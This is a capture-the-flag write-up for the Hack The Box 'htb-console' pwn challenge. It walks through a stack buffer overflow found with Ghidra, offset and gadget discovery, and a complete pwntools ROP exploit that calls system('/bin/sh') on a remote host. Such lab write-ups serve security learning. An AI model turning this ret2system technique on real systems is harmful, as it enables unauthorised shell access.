@A3r1t Notes for HTB-Console pwn challenge from Hackthebox 

---

# Analysis

## -File Ch3ck
```shell
┌──(kali㉿kali)-[~/Desktop/HTB_BE_track]
└─$ file htb-console 
htb-console: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=575e4055094a7f059c67032dd049e4fdbb171266, for GNU/Linux 3.2.0, stripped
```

```shell
┌──(kali㉿kali)-[~/Desktop/HTB_BE_track]
└─$ checksec --file=htb-console 
[*] '/home/kali/Desktop/HTB_BE_track/htb-console'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
``` 

- 64 bit
- Stripped
- Non Executable Stack


---

## -Ghidra

```c
void driver(char *param_1)

{
  int iVar1;
  char input [16];
  
  iVar1 = strcmp(param_1,"id\n");
  if (iVar1 == 0) {
    puts("guest(1337) guest(1337) HTB(31337)");
  }
  else {
    iVar1 = strcmp(param_1,"dir\n");
    if (iVar1 == 0) {
      puts("/home/HTB");
    }
    else {
      iVar1 = strcmp(param_1,"flag\n");
      if (iVar1 == 0) {
        printf("Enter flag: ");
        fgets(input,48,stdin);
        puts("Whoops, wrong flag!");
      }
      else {
        iVar1 = strcmp(param_1,"hof\n");
        if (iVar1 == 0) {
          puts("Register yourself for HTB Hall of Fame!");
          printf("Enter your name: ");
          fgets(&DAT_004040b0,10,stdin);
          puts("See you on HoF soon! :)");
        }
        else {
          iVar1 = strcmp(param_1,"ls\n");
          if (iVar1 == 0) {
            puts("- Boxes");
            puts("- Challenges");
            puts("- Endgames");
            puts("- Fortress");
            puts("- Battlegrounds");
          }
          else {
            iVar1 = strcmp(param_1,"date\n");
            if (iVar1 == 0) {
              system("date");
            }
            else {
              puts("Unrecognized command.");
            }
          }
        }
      }
    }
  }
  return;
}
```

Under **flag** we can see **BOF** as 48 bytes are allowed to enter as buffer size is only 16 bytes. And Since the stack is not executable we will be doing **ROP**.

---

## -Find1ng 0ffs3t

Since out **input** array is 24 bytes below **RBP** as we can see from **GHIDRA**
Therefore, our offset is 24
```text
undefined         AL:1           <RETURN>
char *            RDI:8          param_1
undefined1[16]    Stack[-0x18]   input                               
undefined8        Stack[-0x20]:8 local_20                             
```

---
## -@ddr3ss for out paramter 1nput

We can use this input as our parameter for **system** function so we need to find the address where our input goes.

```text
gef➤  r
Starting program: /home/kali/Desktop/HTB_BE_track/htb-console 
Welcome HTB Console Version 0.1 Beta.
>> hof
Register yourself for HTB Hall of Fame!
Enter your name: /bin/sh
See you on HoF soon! :)
>> ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7ec655e in __GI___libc_read (fd=0x0, buf=0x7ffff7fa6a23 <_IO_2_1_stdin_+131>, nbytes=0x1) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x007ffff7fa69a0  →  0x00000000fbad208b
$rcx   : 0x007ffff7ec655e  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffddf8  →  0x007ffff7e58cdc  →  <_IO_file_underflow+396> test rax, rax
$rbp   : 0x007ffff7fa84a0  →  0x0000000000000000
$rsi   : 0x007ffff7fa6a23  →  0xfa9680000000000a ("\n"?)
$rdi   : 0x0               
$rip   : 0x007ffff7ec655e  →  0x5a77fffff0003d48 ("H="?)
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0000000040214e  →  0x1b01000000203e3e (">> "?)
$r11   : 0x246             
$r12   : 0x007ffff7fa76c0  →  0x00000000fbad2887
$r13   : 0xd68             
$r14   : 0x007ffff7fa78a0  →  0x0000000000000000
$r15   : 0x007ffff7fa8608  →  0x007ffff7e5aa70  →  <_IO_cleanup+0> push r15
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffddf8│+0x0000: 0x007ffff7e58cdc  →  <_IO_file_underflow+396> test rax, rax    ← $rsp
0x007fffffffde00│+0x0008: 0x000000004010b0  →   endbr64 
0x007fffffffde08│+0x0010: 0x0000000000000000
0x007fffffffde10│+0x0018: 0x0000000000000000
0x007fffffffde18│+0x0020: 0x007ffff7fa69a0  →  0x00000000fbad208b
0x007fffffffde20│+0x0028: 0x007ffff7fa84a0  →  0x0000000000000000
0x007fffffffde28│+0x0030: 0x007ffff7fa69a0  →  0x00000000fbad208b
0x007fffffffde30│+0x0038: 0x007ffff7fa6a24  →  0xf7fa968000000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7ec6558 <read+8>         test   eax, eax
   0x7ffff7ec655a <read+10>        jne    0x7ffff7ec6570 <__GI___libc_read+32>
   0x7ffff7ec655c <read+12>        syscall 
 → 0x7ffff7ec655e <read+14>        cmp    rax, 0xfffffffffffff000
   0x7ffff7ec6564 <read+20>        ja     0x7ffff7ec65c0 <__GI___libc_read+112>
   0x7ffff7ec6566 <read+22>        ret    
   0x7ffff7ec6567 <read+23>        nop    WORD PTR [rax+rax*1+0x0]
   0x7ffff7ec6570 <read+32>        sub    rsp, 0x28
   0x7ffff7ec6574 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "htb-console", stopped 0x7ffff7ec655e in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7ec655e → __GI___libc_read(fd=0x0, buf=0x7ffff7fa6a23 <_IO_2_1_stdin_+131>, nbytes=0x1)
[#1] 0x7ffff7e58cdc → _IO_new_file_underflow(fp=0x7ffff7fa69a0 <_IO_2_1_stdin_>)
[#2] 0x7ffff7e59f42 → __GI__IO_default_uflow(fp=0x7ffff7fa69a0 <_IO_2_1_stdin_>)
[#3] 0x7ffff7e4d27c → __GI__IO_getline_info(fp=0x7ffff7fa69a0 <_IO_2_1_stdin_>, buf=0x7fffffffdf00 "", n=0xf, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7ffff7e4d378 → __GI__IO_getline(fp=0x7ffff7fa69a0 <_IO_2_1_stdin_>, buf=0x7fffffffdf00 "", n=0xf, delim=0xa, extract_delim=0x1)
[#5] 0x7ffff7e4c276 → _IO_fgets(buf=0x7fffffffdf00 "", n=0x10, fp=0x7ffff7fa69a0 <_IO_2_1_stdin_>)
[#6] 0x4013de → lea rax, [rbp-0x10]
[#7] 0x7ffff7dff7fd → __libc_start_main(main=0x401397, argc=0x1, argv=0x7fffffffe008, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdff8)
[#8] 0x4010de → hlt 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/10s 0x4040b0
0x4040b0:       "/bin/sh\n"
0x4040b9:       ""
0x4040ba:       ""
0x4040bb:       ""
0x4040bc:       ""
0x4040bd:       ""
0x4040be:       ""
0x4040bf:       ""
0x4040c0:       ""
0x4040c1:       ""
gef➤
```

---

## -Address of SYSTEM function

Since **PIE** is disabled all the addresses will not be changed and we can find the system function from gdb itself.
```text
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  printf@plt
0x0000000000401060  memset@plt
0x0000000000401070  alarm@plt
0x0000000000401080  fgets@plt
0x0000000000401090  strcmp@plt
0x00000000004010a0  setvbuf@plt
gef➤     
```

---

## -R0P Address
Since we need to pass argument to the system function and according to the calling conventions in 64-bit architecture 1st argument goes into `rdi`.

Using `ROPgadgets` to find a gadget. Here using `pop rdi ; ret`

```shell
┌──(kali㉿kali)-[~/Desktop/HTB_BE_track]
└─$ python3 /opt/ROPgadget/ROPgadget.py --binary htb-console | grep "pop rdi"
0x0000000000401473 : pop rdi ; ret
```

---
# Exploit

```python
from pwn import *
#target = process('./htb-console')

target = remote('<__ip__>',31150)

context(os='linux',arch='amd64') 

padding = 24

rop = pack(0x00401473)
binsh_add = pack(0x004040b0)
sysFunc = pack(0x00401040) 

target.sendlineafter('>>','hof')
target.sendlineafter('your name:','/bin/sh')
target.sendlineafter('>>','flag')

payload = 'a'*padding + rop + binsh_add + sysFunc

target.sendlineafter('flag:',payload)

target.interactive()
```
